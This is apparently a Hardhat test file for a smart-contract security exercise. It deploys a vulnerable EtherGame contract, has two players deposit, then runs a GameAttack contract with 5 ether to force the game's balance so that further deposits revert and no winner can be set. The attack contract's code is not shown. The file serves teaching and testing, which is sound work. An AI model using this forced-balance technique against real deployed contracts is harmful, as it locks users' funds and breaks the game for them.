import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { EtherGame, GameAttack } from '../typechain-types';

const { provider, deployContract, getSigners, parseEther } = ethers;

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

describe('Oracle Manipulation Exercise 1', function () {
  let deployer: SignerWithAddress, attacker: SignerWithAddress, alice: SignerWithAddress, bob: SignerWithAddress, charlie: SignerWithAddress;

  let game: EtherGame;
  let attack: GameAttack;

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, alice, bob, charlie, attacker] = await getSigners();

    // Deploy contracts
    game = await deployContract('EtherGame');
    attack = await deployContract('GameAttack', [game.target], attacker);

    // Players deposit 1 ether
    await game.connect(alice).deposit({ value: parseEther('1') });
    await game.connect(bob).deposit({ value: parseEther('1') });
  });

  it('Exploit', async function () {
    attack.attack({ value: parseEther('5') });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Anyone can't deposit anymore
    await expect(game.connect(charlie).deposit({ value: parseEther('1') })).to.be.reverted;
  });
});

